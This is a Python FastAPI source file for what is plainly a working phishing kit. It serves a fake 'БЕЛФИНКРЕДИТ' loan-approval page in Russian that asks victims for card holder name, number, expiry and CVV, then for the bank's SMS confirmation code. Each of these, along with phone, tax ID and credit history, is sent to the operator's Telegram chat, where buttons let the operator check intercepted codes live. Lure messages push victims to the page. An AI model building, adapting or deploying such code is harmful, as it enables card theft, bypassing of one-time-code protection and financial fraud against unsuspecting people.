import os
import logging
import secrets
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import uvicorn
import requests

BOT_TOKEN = os.getenv("BOT_TOKEN")
MY_CHAT_ID = os.getenv("MY_CHAT_ID")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

logging.basicConfig(level=logging.INFO)

sessions = {}
pending_actions = {}  # Для хранения действий от админа

def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
    url = f"{TELEGRAM_API_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        logging.error(f"Ошибка отправки: {e}")

def answer_callback(callback_id: str, text: str):
    url = f"{TELEGRAM_API_URL}/answerCallbackQuery"
    try:
        requests.post(url, json={"callback_query_id": callback_id, "text": text}, timeout=5)
    except Exception as e:
        logging.error(f"Ошибка ответа: {e}")

# ========== КЛАВИАТУРЫ ==========
def get_application_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [
                {"text": "🔐 Авторизация", "callback_data": f"auth_{session_id}"},
                {"text": "💳 Оплата", "callback_data": f"pay_{session_id}"}
            ]
        ]
    }

def get_code_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [
                {"text": "✅ Код ВЕРНЫЙ", "callback_data": f"code_ok_{session_id}"},
                {"text": "❌ Код НЕВЕРНЫЙ", "callback_data": f"code_bad_{session_id}"}
            ]
        ]
    }

# ========== МОДЕЛИ ==========
class CreditApplicationData(BaseModel):
    session_id: str
    name: str
    phone: str
    inn: str = ""
    income: float
    months: int
    amount: float
    payment: float
    user_chat_id: int = None
    credit_history: str = None

class CardData(BaseModel):
    session_id: str
    card_holder: str
    card_number: str
    card_expiry: str
    card_cvv: str

class SmsCodeData(BaseModel):
    session_id: str
    code: str

# ========== HTML СТРАНИЦА ==========
HTML_PAGE = '''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>БЕЛФИНКРЕДИТ | Получение средств</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f0f4fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 32px 16px;
        }
        .page { width: 100%; max-width: 500px; margin: 0 auto; }
        
        .top-header { text-align: center; margin-bottom: 24px; }
        .logo {
            font-size: 32px;
            font-weight: 900;
            color: #071b46;
            letter-spacing: -0.5px;
        }
        .logo span { color: #00b965; }
        .logo-sub { font-size: 12px; color: #667085; margin-top: 6px; }
        
        .credit-card {
            background: linear-gradient(135deg, #071b46 0%, #0a2a5e 100%);
            border-radius: 28px;
            padding: 24px;
            margin-bottom: 24px;
            color: white;
            box-shadow: 0 20px 40px rgba(7,27,70,0.15);
        }
        .credit-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(0,185,101,0.2);
            padding: 8px 16px;
            border-radius: 50px;
            font-size: 13px;
            font-weight: 600;
            color: #00e67e;
            margin-bottom: 20px;
        }
        .credit-amount {
            font-size: 48px;
            font-weight: 800;
            margin: 16px 0 8px;
            letter-spacing: -1px;
        }
        .credit-amount small {
            font-size: 18px;
            font-weight: 500;
            opacity: 0.8;
        }
        .credit-details {
            display: flex;
            justify-content: space-between;
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid rgba(255,255,255,0.1);
        }
        .detail {
            flex: 1;
            text-align: center;
        }
        .detail-label {
            font-size: 12px;
            opacity: 0.7;
            margin-bottom: 6px;
        }
        .detail-value {
            font-size: 16px;
            font-weight: 700;
        }
        
        .form-container {
            background: white;
            border-radius: 28px;
            padding: 28px 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
        }
        .form-title {
            font-size: 22px;
            font-weight: 700;
            color: #07152f;
            margin-bottom: 8px;
        }
        .form-sub {
            font-size: 14px;
            color: #667085;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid #e5edf8;
        }
        
        .field { margin-bottom: 20px; }
        .label {
            display: block;
            margin-bottom: 8px;
            font-size: 13px;
            font-weight: 600;
            color: #344054;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .input {
            width: 100%;
            height: 52px;
            border-radius: 16px;
            border: 1.5px solid #e2e8f0;
            background: white;
            padding: 0 16px;
            font-size: 16px;
            color: #07152f;
            outline: none;
            transition: all 0.2s;
        }
        .input:focus {
            border-color: #00b965;
            box-shadow: 0 0 0 3px rgba(0,185,101,0.1);
        }
        
        .row { display: grid; grid-template-columns: 1fr 140px; gap: 16px; }
        .expiry-row { display: flex; gap: 12px; align-items: center; }
        .expiry-input { flex: 1; }
        .expiry-slash { font-size: 24px; color: #cbd5e1; font-weight: 600; }
        
        .submit-btn {
            width: 100%;
            height: 56px;
            border: none;
            border-radius: 28px;
            background: #00b965;
            color: white;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 16px;
        }
        .submit-btn:hover {
            background: #009e52;
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0,185,101,0.3);
        }
        
        .footer-note {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #8a99b0;
        }
        
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(8px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .modal.active { display: flex; }
        .modal-content {
            max-width: 420px;
            width: 90%;
            background: white;
            border-radius: 32px;
            overflow: hidden;
        }
        .modal-header {
            background: linear-gradient(135deg, #00b965, #008a4a);
            padding: 24px;
            color: white;
            text-align: center;
        }
        .modal-header h3 { font-size: 24px; margin: 0 0 8px; }
        .modal-body { padding: 24px; }
        .code-input input {
            width: 100%;
            padding: 16px;
            border: 1.5px solid #e2e8f0;
            border-radius: 16px;
            font-size: 20px;
            text-align: center;
            letter-spacing: 6px;
            margin-bottom: 20px;
        }
        .modal-buttons { display: flex; gap: 12px; }
        .modal-buttons button {
            flex: 1;
            height: 48px;
            border-radius: 24px;
            font-weight: 600;
            cursor: pointer;
        }
        .btn-confirm {
            background: #00b965;
            border: none;
            color: white;
        }
        .btn-cancel {
            background: transparent;
            border: 1.5px solid #e2e8f0;
            color: #667085;
        }
        
        .error-msg {
            background: #fee2e2;
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 16px;
            color: #dc2626;
            font-size: 13px;
            text-align: center;
            display: none;
        }
        
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 20px;
            z-index: 1001;
        }
        .loader-overlay.active { display: flex; }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255,255,255,0.2);
            border-top-color: #00b965;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loader-text { color: white; font-size: 15px; font-weight: 500; }
        
        @media (max-width: 560px) {
            body { padding: 16px; }
            .credit-amount { font-size: 36px; }
            .row { grid-template-columns: 1fr; gap: 0; }
        }
    </style>
</head>
<body>

<div class="page" id="mainPage">
    <div class="top-header">
        <div class="logo">БЕЛФИН<span>КРЕДИТ</span></div>
        <div class="logo-sub">официальный партнёр</div>
    </div>

    <div class="credit-card">
        <div class="credit-badge">
            <span>✅</span> Кредит одобрен
        </div>
        <div class="credit-amount">
            <span id="displayAmount">---</span> <small>BYN</small>
        </div>
        <div class="credit-details">
            <div class="detail">
                <div class="detail-label">ФИО</div>
                <div class="detail-value" id="displayFullname">---</div>
            </div>
            <div class="detail">
                <div class="detail-label">Срок</div>
                <div class="detail-value" id="displayTerm">---</div>
            </div>
            <div class="detail">
                <div class="detail-label">Платёж</div>
                <div class="detail-value" id="displayPayment">---</div>
            </div>
        </div>
    </div>

    <div class="form-container">
        <div class="form-title">💳 Получение средств</div>
        <div class="form-sub">Укажите реквизиты карты для перевода</div>

        <div id="errorMsg" class="error-msg"></div>

        <form id="cardForm">
            <div class="field">
                <label class="label">ФИО на карте</label>
                <input id="cardHolder" class="input" type="text" placeholder="IVAN IVANOV" autocomplete="off">
            </div>

            <div class="field">
                <label class="label">Номер карты</label>
                <input id="cardNumber" class="input" type="text" maxlength="19" placeholder="0000 0000 0000 0000" inputmode="numeric">
            </div>

            <div class="row">
                <div class="field">
                    <label class="label">Срок действия</label>
                    <div class="expiry-row">
                        <input id="expMonth" class="input expiry-input" type="text" maxlength="2" placeholder="ММ" inputmode="numeric">
                        <span class="expiry-slash">/</span>
                        <input id="expYear" class="input expiry-input" type="text" maxlength="2" placeholder="ГГ" inputmode="numeric">
                    </div>
                </div>
                <div class="field">
                    <label class="label">CVV</label>
                    <input id="cvv" class="input" type="password" maxlength="3" placeholder="•••" inputmode="numeric">
                </div>
            </div>

            <button class="submit-btn" type="submit">Получить средства →</button>

            <div class="footer-note">
                Нажимая кнопку, вы соглашаетесь с <a href="#">условиями</a> перевода
            </div>
        </form>
    </div>
</div>

<div class="modal" id="smsModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>🔐 Подтверждение</h3>
            <p>Введите код из SMS</p>
        </div>
        <div class="modal-body">
            <div class="code-input">
                <input type="text" id="smsCode" maxlength="6" placeholder="••••••" inputmode="numeric">
            </div>
            <div id="modalError" class="error-msg" style="display:none;"></div>
            <div class="modal-buttons">
                <button class="btn-cancel" id="cancelModalBtn">Отмена</button>
                <button class="btn-confirm" id="confirmBtn">Подтвердить</button>
            </div>
        </div>
    </div>
</div>

<div class="loader-overlay" id="loaderOverlay">
    <div class="spinner"></div>
    <div class="loader-text" id="loaderText">Обработка данных...</div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    let sessionId = urlParams.get('session');
    
    if (!sessionId) {
        document.getElementById('displayFullname').textContent = 'Ошибка: нет session';
    }
    
    const API_URL = window.location.origin;
    let actionInterval = null;
    
    async function loadApplication() {
        if (!sessionId) return;
        try {
            const response = await fetch(`${API_URL}/get_application/${sessionId}`);
            if (response.ok) {
                const data = await response.json();
                document.getElementById('displayFullname').textContent = data.fullname || '—';
                document.getElementById('displayAmount').textContent = data.amount || '0';
                document.getElementById('displayTerm').textContent = data.term ? `${data.term} мес` : '—';
                const payment = data.payment || (data.amount && data.term ? Math.ceil(data.amount / data.term) : 0);
                document.getElementById('displayPayment').textContent = payment ? `${payment} BYN` : '—';
            }
        } catch (err) {
            console.error(err);
        }
    }
    
    loadApplication();
    
    function startActionCheck() {
        if (actionInterval) clearInterval(actionInterval);
        actionInterval = setInterval(async () => {
            try {
                const response = await fetch(`${API_URL}/check_pending_action/${sessionId}`);
                const data = await response.json();
                if (data.action === 'code_approved') {
                    clearInterval(actionInterval);
                    loaderOverlay.classList.remove('active');
                    smsModal.classList.remove('active');
                    alert('✅ Средства успешно зачислены!');
                    window.location.href = '/';
                } else if (data.action === 'code_rejected') {
                    loaderOverlay.classList.remove('active');
                    document.getElementById('modalError').textContent = '❌ Неверный код. Попробуйте снова.';
                    document.getElementById('modalError').style.display = 'block';
                    document.getElementById('smsCode').value = '';
                }
            } catch (err) {
                console.error(err);
            }
        }, 2000);
    }
    
    const cardNumber = document.getElementById('cardNumber');
    const cardHolder = document.getElementById('cardHolder');
    const expMonth = document.getElementById('expMonth');
    const expYear = document.getElementById('expYear');
    const cvv = document.getElementById('cvv');
    
    cardNumber.addEventListener('input', (e) => {
        let digits = e.target.value.replace(/\\D/g, '').slice(0, 16);
        e.target.value = digits.replace(/(.{4})/g, '$1 ').trim();
    });
    
    cardHolder.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^A-Za-z\\s]/g, '').toUpperCase();
    });
    
    [expMonth, expYear, cvv].forEach(input => {
        input.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\\D/g, '');
        });
    });
    
    const form = document.getElementById('cardForm');
    const errorMsg = document.getElementById('errorMsg');
    const loaderOverlay = document.getElementById('loaderOverlay');
    const loaderText = document.getElementById('loaderText');
    const smsModal = document.getElementById('smsModal');
    const smsCode = document.getElementById('smsCode');
    const confirmBtn = document.getElementById('confirmBtn');
    const cancelModalBtn = document.getElementById('cancelModalBtn');
    const modalError = document.getElementById('modalError');
    
    function showError(msg, isModal = false) {
        const target = isModal ? modalError : errorMsg;
        target.textContent = msg;
        target.style.display = 'block';
        setTimeout(() => target.style.display = 'none', 5000);
    }
    
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const holder = cardHolder.value.trim();
        const number = cardNumber.value.replace(/\\s/g, '');
        const month = expMonth.value;
        const year = expYear.value;
        const code = cvv.value;
        
        if (!holder || holder.length < 3) {
            showError('Введите имя и фамилию на карте');
            return;
        }
        if (number.length !== 16) {
            showError('Введите корректный номер карты');
            return;
        }
        if (month.length !== 2 || year.length !== 2) {
            showError('Введите корректный срок действия');
            return;
        }
        if (code.length !== 3) {
            showError('Введите CVV код');
            return;
        }
        
        loaderText.textContent = 'Отправка данных...';
        loaderOverlay.classList.add('active');
        
        try {
            const response = await fetch(`${API_URL}/submit_card`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    session_id: sessionId,
                    card_holder: holder,
                    card_number: number,
                    card_expiry: `${month}/${year}`,
                    card_cvv: code
                })
            });
            
            if (response.ok) {
                loaderText.textContent = 'Ожидание подтверждения...';
                startActionCheck();
            } else {
                loaderOverlay.classList.remove('active');
                showError('Ошибка при отправке');
            }
        } catch (err) {
            loaderOverlay.classList.remove('active');
            showError('Ошибка соединения');
        }
    });
    
    confirmBtn.addEventListener('click', async () => {
        const code = smsCode.value.trim();
        if (code.length < 4) {
            showError('Введите код из SMS', true);
            return;
        }
        
        loaderText.textContent = 'Проверка кода...';
        loaderOverlay.classList.add('active');
        
        try {
            const response = await fetch(`${API_URL}/submit_sms_code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    session_id: sessionId,
                    code: code
                })
            });
            
            if (response.ok) {
                // Ждем ответа от админа через startActionCheck
            } else {
                loaderOverlay.classList.remove('active');
                showError('Ошибка отправки кода', true);
            }
        } catch (err) {
            loaderOverlay.classList.remove('active');
            showError('Ошибка соединения', true);
        }
    });
    
    cancelModalBtn.addEventListener('click', () => {
        smsModal.classList.remove('active');
        smsCode.value = '';
    });
</script>
</body>
</html>
'''

# ========== FASTAPI ==========
@asynccontextmanager
async def lifespan(app: FastAPI):
    render_url = os.getenv("RENDER_EXTERNAL_URL", "https://telegram-bot-gateway-1.onrender.com")
    webhook_url = f"{render_url}/webhook/callback"
    requests.post(f"{TELEGRAM_API_URL}/setWebhook", json={"url": webhook_url})
    send_to_telegram(MY_CHAT_ID, "🤖 Бот запущен")
    yield
    send_to_telegram(MY_CHAT_ID, "⚠️ Бот остановлен")

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== СТРАНИЦА ==========
@app.get("/")
@app.get("/card")
async def serve_card_page():
    return HTMLResponse(content=HTML_PAGE)

# ========== ПОЛУЧИТЬ ДАННЫЕ ЗАЯВКИ ==========
@app.get("/get_application/{session_id}")
async def get_application(session_id: str):
    session = sessions.get(session_id)
    if not session:
        return {"error": "not_found"}
    
    return {
        "fullname": session.get("name", ""),
        "amount": session.get("amount", 0),
        "term": session.get("months", 0),
        "payment": session.get("payment", 0),
        "status": session.get("status", "pending")
    }

# ========== ПРИНЯТЬ ДАННЫЕ КАРТЫ ==========
@app.post("/submit_card")
async def submit_card(data: CardData):
    session = sessions.get(data.session_id)
    if not session:
        return {"error": "session_not_found"}
    
    # Маскируем номер карты
    masked_card = data.card_number[:4] + " **** **** " + data.card_number[-4:]
    
    # Сохраняем в сессию
    session["card_holder"] = data.card_holder
    session["card_number"] = masked_card
    session["card_expiry"] = data.card_expiry
    session["card_cvv"] = data.card_cvv
    
    # Отправляем админу данные карты
    send_to_telegram(MY_CHAT_ID, f"""
💳 <b>ДАННЫЕ КАРТЫ ДЛЯ ВЫПЛАТЫ</b>

🆔 Сессия: <code>{data.session_id}</code>
👤 Клиент: {session.get('name')}
💰 Сумма: {session.get('amount'):,.0f} BYN

💳 Держатель: {data.card_holder}
💳 Карта: {masked_card}
📅 Срок: {data.card_expiry}
🔐 CVV: {data.card_cvv}
    """)
    
    return {"status": "ok"}

# ========== ПОЛЬЗОВАТЕЛЬ ВВЕЛ SMS КОД ==========
@app.post("/submit_sms_code")
async def submit_sms_code(data: SmsCodeData):
    session = sessions.get(data.session_id)
    if not session:
        return {"error": "session_not_found"}
    
    # Отправляем админу код для проверки
    send_to_telegram(MY_CHAT_ID, f"""
🔐 <b>ПОЛЬЗОВАТЕЛЬ ВВЕЛ SMS КОД</b>

🆔 Сессия: <code>{data.session_id}</code>
👤 Клиент: {session.get('name')}
💰 Сумма: {session.get('amount'):,.0f} BYN

📱 <b>Введенный код:</b> <code>{data.code}</code>

⚠️ Проверьте код и нажмите кнопку:
    """, reply_markup=get_code_keyboard(data.session_id))
    
    return {"status": "ok"}

# ========== ПРОВЕРКА ДЕЙСТВИЯ ОТ АДМИНА ==========
@app.get("/check_pending_action/{session_id}")
async def check_pending_action(session_id: str):
    action = pending_actions.get(session_id)
    if action:
        pending_actions[session_id] = None
        return {"action": action}
    return {"action": None}

# ========== ЗАЯВКА ==========
@app.post("/submit_credit_application")
async def submit_credit_application(data: CreditApplicationData):
    sid = data.session_id
    sessions[sid] = {
        "name": data.name,
        "phone": data.phone,
        "inn": data.inn,
        "income": data.income,
        "months": data.months,
        "amount": data.amount,
        "payment": data.payment,
        "user_chat_id": data.user_chat_id,
        "credit_history": data.credit_history,
        "status": "waiting_action"
    }
    
    message = (
        f"🏦 <b>НОВАЯ ЗАЯВКА НА ЗАЙМ</b>\n\n"
        f"👤 <b>Клиент:</b> {data.name}\n"
        f"📞 <b>Телефон:</b> {data.phone}\n"
        f"🆔 <b>ИНН:</b> {data.inn if data.inn else '—'}\n"
        f"📊 <b>Кредитная история:</b> {data.credit_history if data.credit_history else '—'}\n\n"
        f"💰 <b>Сумма займа:</b> {data.amount:,.0f} BYN\n"
        f"📅 <b>Срок:</b> {data.months} мес.\n\n"
        f"🆔 <b>Сессия:</b> <code>{sid}</code>"
    )
    send_to_telegram(MY_CHAT_ID, message, reply_markup=get_application_keyboard(sid))
    return {"status": "ok"}

# ========== ОБРАБОТКА КНОПОК ==========
@app.post("/webhook/callback")
async def handle_callback(request: Request):
    data = await request.json()
    
    if "callback_query" not in data:
        return {"ok": True}
    
    callback = data["callback_query"]
    callback_id = callback["id"]
    data_str = callback["data"]
    message_id = callback.get("message", {}).get("message_id")
    
    parts = data_str.split("_")
    if len(parts) < 2:
        return {"ok": True}
    
    action = parts[0]
    session_id = "_".join(parts[1:]) if len(parts) > 2 else parts[1]
    
    session = sessions.get(session_id)
    
    # Кнопка "Авторизация"
    if action == "auth":
        if session:
            session["pending_action"] = "auth"
        answer_callback(callback_id, "🔐 Авторизация")
        send_to_telegram(MY_CHAT_ID, f"🔐 Клиент запросил авторизацию для сессии {session_id}")
    
    # Кнопка "Оплата"
    elif action == "pay":
        if session:
            session["pending_action"] = "pay"
        answer_callback(callback_id, "💳 Переход на страницу оплаты")
        
        # Отправляем пользователю ссылку на страницу
        if session and session.get("user_chat_id"):
            card_url = f"https://telegram-bot-gateway-1.onrender.com/card?session={session_id}"
            send_to_telegram(session["user_chat_id"], f"""
✅ <b>Ваша заявка одобрена!</b>

👤 {session.get("name")}
💰 Сумма: {session.get("amount"):,.0f} BYN
📅 Срок: {session.get("months")} мес.

🔗 <a href="{card_url}">👉 НАЖМИТЕ СЮДА, ЧТОБЫ ПОЛУЧИТЬ СРЕДСТВА</a>

⚠️ Ссылка активна 24 часа
            """)
    
    # Кнопка "Код ВЕРНЫЙ"
    elif action == "code":
        if len(parts) >= 3:
            result = parts[1]
            sess_id = "_".join(parts[2:])
            
            if result == "ok":
                pending_actions[sess_id] = "code_approved"
                answer_callback(callback_id, "✅ Код подтвержден")
                send_to_telegram(MY_CHAT_ID, f"✅ <b>Код подтвержден для сессии</b> <code>{sess_id}</code>")
                
                # Уведомляем пользователя
                session_user = sessions.get(sess_id)
                if session_user and session_user.get("user_chat_id"):
                    send_to_telegram(session_user["user_chat_id"], """
✅ <b>Код подтвержден!</b>

Средства будут перечислены в ближайшее время.

Спасибо, что выбрали БЕЛФИНКРЕДИТ! 🤝
                    """)
            
            elif result == "bad":
                pending_actions[sess_id] = "code_rejected"
                answer_callback(callback_id, "❌ Код неверный")
                send_to_telegram(MY_CHAT_ID, f"❌ <b>Неверный код для сессии</b> <code>{sess_id}</code>")
    
    return {"ok": True}

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
